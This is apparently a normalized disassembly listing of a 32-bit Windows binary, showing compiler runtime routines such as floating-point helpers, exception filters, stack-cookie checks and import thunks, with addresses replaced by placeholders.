sub esp 0x8
and esp 0xfffffff0
fstp [ esp ]
movq xmm0 [ esp ]
call sub_41adce
leave
retn
sub_41adc8
movlpd xmm0 [ esp + 0x4 ]
sub_41b4ab
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41b3fa
sub_41b500
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41b517
add esp 0xc
pop ebp
retn
sub_41b5a4
call sub_416c32
xor ecx ecx
test al al
sete cl
mov eax ecx
retn
sub_41b67e
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp [ eax ] 0xc000001d
je r-xdata
xor eax eax
retn
sub_41b6c5
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_41b75f
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_41b7e1
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_41b800
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_41c6c0
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff0
fstp [ esp ]
movq xmm0 [ esp ]
call sub_41c6de
leave
retn
sub_41c6d8
movlpd xmm0 [ esp + 0x4 ]
j_sub_41a818#2
jmp sub_41a818
sub_41c9b8
fstp st0
fstp st0
fld [ r--data ]
mov [ ebp - 0x90 ] 0x2
retn
sub_41c9e4
mov [ ebp - 0x90 ] 0x2
fstp st0
fld [ r--data ]
retn
sub_41c9f4
or cl cl
jne r-xdata
jmp r-xdata
retn
fstp st0
fld [ r--data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
mov [ ebp - 0x90 ] 0x1
sub_41c9f9
fldlg2
jmp r-xdata
fxch st1
or cl cl
jne r-xdata
jmp sub_41a8b3
fyl2x
retn
sub_41c9fd
fldln2
fxch st1
or cl cl
jne r-xdata
jmp sub_41a8b3
fyl2x
retn
j_sub_41a818
jmp sub_41a818
sub_41ca49
fstp st0
jmp r-xdata
fstp st0
fld [ r--data ]
cmp [ ebp - 0x90 ] 0x0
jg r-xdata
or cl cl
retn
mov [ ebp - 0x90 ] 0x1
sub_41ca7f
fstp st0
fstp st0
fld [ r--data ]
mov [ ebp - 0x90 ] 0x3
retn
sub_41ca91
or cl cl
jne r-xdata
jmp sub_41a806
fstp st0
fld [ r--data ]
retn
sub_41cef6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fld [ ebp + 0x8 ]
frndint
fstp [ ebp - 0x8 ]
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
SystemFunction036
jmp [ SystemFunction036@IAT ]
sub_41d0a9
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_41d239
mov ecx [ ebp - 0x1c ]
xor ecx ebp
sub_40a8ab
sub_40b336
sub_41d390
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40a8c0
sub_41d3a6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40a8c0
sub_41d710
push 0x318
mov eax [ ebp - 0x1028 ]
push eax
call sub_40a894
add esp 0x8
retn
sub_41d725
lea ecx [ ebp - 0x1024 ]
jmp sub_40c250
sub_41d730
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1038 ]
xor ecx eax
call sub_40a8ab
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40a8ab
mov eax r--data
jmp sub_40b8b9
sub_41d760
mov ecx [ ebp - 0x10 ]
jmp sub_40c250
sub_41d768
push 0x7e0
mov eax [ ebp - 0x14 ]
push eax
call sub_40a894
add esp 0x8
retn
sub_41d77a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_40a8ab
mov eax r--data
jmp sub_40b8b9
sub_41d7a0
push 0x1
mov eax [ ebp + 0xc ]
push eax
call sub_40a894
add esp 0x8
retn
sub_41d7af
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_40a8ab
mov eax r--data
jmp sub_40b8b9
sub_41d7ca
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40a8ab
mov eax r--data
jmp sub_40b8b9
